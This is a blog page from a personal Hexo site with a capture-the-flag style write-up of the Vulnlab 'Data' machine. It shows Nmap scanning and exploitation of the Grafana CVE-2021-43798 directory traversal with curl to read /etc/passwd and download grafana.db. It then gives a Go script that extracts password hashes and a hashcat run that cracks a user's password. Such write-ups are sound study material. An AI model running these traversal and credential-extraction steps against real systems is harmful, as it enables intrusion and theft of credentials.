@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Muyi">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/01/28/vulnlab-data/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/elmo-launch.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/elmo-launch.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/elmo-launch.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Vulnlab-Data | Muy1&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":5,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Blog for storing the knowledges I need (;","subtitle":{"text":["sudo echo \"subtitle goes here\""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Muy1&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="https://assets.vulnlab.com/data_slide.png" alt="Vulnlab-Data" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">Vulnlab-Data</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/elmo.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Muyi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-01-28 13:53:32</span>
+        <span class="mobile">2025-01-28 13:53:32</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-01-28 14:34:16</span>
+            <span class="mobile">2025-01-28 14:34:16</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Vulnlab/">Vulnlab</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Easy/">Easy</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Linux/">Linux</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Nmap scanning</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 14:46 +08</span><br><span class="line">Nmap scan report for 10.10.102.141</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">3000/tcp open  ppp?</span><br><span class="line">... unrecognized service goes here ...</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 105.79 seconds</span><br></pre></td></tr></table></figure></div>
+<p>notice that port 22 and 3000 is open</p>
+<h3 id="Grafana"><a href="#Grafana" class="headerlink" title="Grafana"></a>Grafana</h3><p>Try to see what is hosting over port 3000</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Data~10.10.102.141$ curl http://<span class="variable">$ip</span>:3000</span><br><span class="line">&lt;a href=<span class="string">&quot;/login&quot;</span>&gt;Found&lt;/a&gt;.</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnlab-data/grafana-web.png"
+                      alt="grafana-web"
+                ></p>
+<p>Going through the source code of the website, seems like there’s no hardcoded credentials to be used</p>
+<br>
+
+<p>Try to fuzz the website on port 3000 for more content, but seems like there’s nothing also</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Data~10.10.102.141$ ffuf -u http://<span class="variable">$ip</span>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.10.102.141/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:: Progress: [20478/20478] :: Job [1/1] :: 112 req/sec :: Duration: [0:03:21] :: Errors: 20478 ::</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Google for <code>Grafana v8.0.0</code> and found out that there’s a CVE known as <code>CVE-2021-43798</code>, which is vulnerable to directory traversal via <code>&lt;grafana_host_url/public/plugins/&lt;plugins_name&gt;/..</code></p>
+<br>
+
+<p>Therefore, try to see if the vulnerability is valid to be used in the port 3000<br>Using the default plugin list in Grafana from [<a class="link"   target="_blank" rel="noopener" href="https://github.com/jas502n/Grafana-CVE-2021-43798]" >https://github.com/jas502n/Grafana-CVE-2021-43798]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~$ curl --path-as-is http://<span class="variable">$ip</span>:3000/public/plugins/&lt;plugins_name&gt;/../../../../../../../../etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/ash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">... more to go ...</span><br><span class="line">grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin</span><br></pre></td></tr></table></figure></div>
+<blockquote>
+<p>using <code>curl</code> + <code>--path-as-is</code> allows the <code>../</code> to be recognized instead in browser which automatically removes the <code>../</code> in the path</p>
+</blockquote>
+<br>
+
+<p>Also using the list from jas520n’s github, discovers few more files that can be read via directory traversal which are:</p>
+<ol>
+<li><code>/etc/grafana/grafana.ini</code></li>
+<li><code>/var/lib/grafana/grafana.db</code> (something interesting might be in database as always)<br><code>/proc/net/fib_trie</code> &amp; <code>/proc/net/tcp</code> returns some interesting error line: <code>seeker cant&#39;t seek</code></li>
+</ol>
+<p>Try to download the grafana.db via directory traversal</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Data~10.10.102.141$ curl --path-as-is http://<span class="variable">$ip</span>:3000/public/plugins/zipkin/../../../../../../../../../../var/lib/grafana/grafana.db --output grafana.db</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  584k  100  584k    0     0   415k      0  0:00:01  0:00:01 --:--:--  415k</span><br></pre></td></tr></table></figure></div>
+<p>Check the .db for potential credentials and found this</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">... more above ...</span><br><span class="line">sqlite<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="number">1</span><span class="operator">|</span><span class="number">0</span><span class="operator">|</span>admin<span class="operator">|</span>admin<span class="variable">@localhost</span><span class="operator">||</span><span class="number">7</span>a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8<span class="operator">|</span>YObSoLj55S<span class="operator">|</span>hLLY6QQ4Y6<span class="operator">||</span><span class="number">1</span><span class="operator">|</span><span class="number">1</span><span class="operator">|</span><span class="number">0</span><span class="operator">||</span><span class="number">2022</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">48</span>:<span class="number">04</span><span class="operator">|</span><span class="number">2022</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">48</span>:<span class="number">50</span><span class="operator">|</span><span class="number">0</span><span class="operator">|</span><span class="number">2022</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">48</span>:<span class="number">50</span><span class="operator">|</span><span class="number">0</span></span><br><span class="line"><span class="number">2</span><span class="operator">|</span><span class="number">0</span><span class="operator">|</span>boris<span class="operator">|</span>boris<span class="variable">@data</span>.vl<span class="operator">|</span>boris<span class="operator">|</span>dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8<span class="operator">|</span>LCBhdtJWjl<span class="operator">|</span>mYl941ma8w<span class="operator">||</span><span class="number">1</span><span class="operator">|</span><span class="number">0</span><span class="operator">|</span><span class="number">0</span><span class="operator">||</span><span class="number">2022</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">49</span>:<span class="number">11</span><span class="operator">|</span><span class="number">2022</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">49</span>:<span class="number">11</span><span class="operator">|</span><span class="number">0</span><span class="operator">|</span><span class="number">2012</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">49</span>:<span class="number">11</span><span class="operator">|</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="Crack-the-Hash"><a href="#Crack-the-Hash" class="headerlink" title="Crack the Hash"></a>Crack the Hash</h3><p>Via vulncheck’s blog [<a class="link"   target="_blank" rel="noopener" href="https://vulncheck.com/blog/grafana-cve-2021-43798]" >https://vulncheck.com/blog/grafana-cve-2021-43798]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, generate the script to retrieve the password</p>
+<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">        <span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">        <span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">        <span class="string">&quot;fmt&quot;</span></span><br><span class="line">        <span class="string">&quot;log&quot;</span></span><br><span class="line">        <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;golang.org/x/crypto/pbkdf2&quot;</span></span><br><span class="line">        <span class="string">&quot;database/sql&quot;</span></span><br><span class="line">        _ <span class="string">&quot;github.com/mattn/go-sqlite3&quot;</span> <span class="comment">// Replace with your database driver</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// EncryptionKeyToBytes generates a key using PBKDF2.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EncryptionKeyToBytes</span><span class="params">(secret, salt <span class="type">string</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> pbkdf2.Key([]<span class="type">byte</span>(secret), []<span class="type">byte</span>(salt), <span class="number">10000</span>, <span class="number">32</span>, sha256.New), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// Replace &quot;your-database-path&quot; with the actual database path</span></span><br><span class="line">        db, err := sql.Open(<span class="string">&quot;sqlite3&quot;</span>, <span class="string">&quot;grafana.db&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Fatalf(<span class="string">&quot;Error opening database: %v&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">defer</span> db.Close()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Prepare output file</span></span><br><span class="line">        hashFile, err := os.Create(<span class="string">&quot;hashes.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Fatalf(<span class="string">&quot;Error creating file: %v&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">defer</span> hashFile.Close()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Query users from the database</span></span><br><span class="line">        rows, err := db.Query(<span class="string">&quot;SELECT email, password, salt, is_admin FROM user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Fatalf(<span class="string">&quot;Error executing query: %v&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">defer</span> rows.Close()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Process each row</span></span><br><span class="line">        <span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">                <span class="keyword">var</span> email, password, salt <span class="type">string</span></span><br><span class="line">                <span class="keyword">var</span> isAdmin <span class="type">bool</span> <span class="comment">// Adjust type if necessary</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// Scan row data</span></span><br><span class="line">                <span class="keyword">if</span> err := rows.Scan(&amp;email, &amp;password, &amp;salt, &amp;isAdmin); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                        log.Printf(<span class="string">&quot;Error scanning row: %v&quot;</span>, err)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Decode password hash</span></span><br><span class="line">                decodedHash, err := hex.DecodeString(password)</span><br><span class="line">                <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                        log.Printf(<span class="string">&quot;Error decoding password for user %s: %v&quot;</span>, email, err)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Base64 encode password and salt</span></span><br><span class="line">                hash64 := base64.StdEncoding.EncodeToString(decodedHash)</span><br><span class="line">                salt64 := base64.StdEncoding.EncodeToString([]<span class="type">byte</span>(salt))</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Write to file</span></span><br><span class="line">                line := fmt.Sprintf(<span class="string">&quot;sha256:10000:%s:%s\n&quot;</span>, salt64, hash64)</span><br><span class="line">                <span class="keyword">if</span> _, err := hashFile.WriteString(line); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                        log.Printf(<span class="string">&quot;Error writing to file: %v&quot;</span>, err)</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check for any errors during iteration</span></span><br><span class="line">        <span class="keyword">if</span> err := rows.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Fatalf(<span class="string">&quot;Error during row iteration: %v&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        log.Println(<span class="string">&quot;Processing completed successfully.&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>After that, using <code>hashcat</code> to retrieve the password</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Data~10.10.102.141/grafanahash$ hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p>Using the password, successfully logged into the website, but nothing interesting in it.</p>
+<p>Possibility of user <code>Boris</code> reusing the password, therefore try SSH into the user</p>
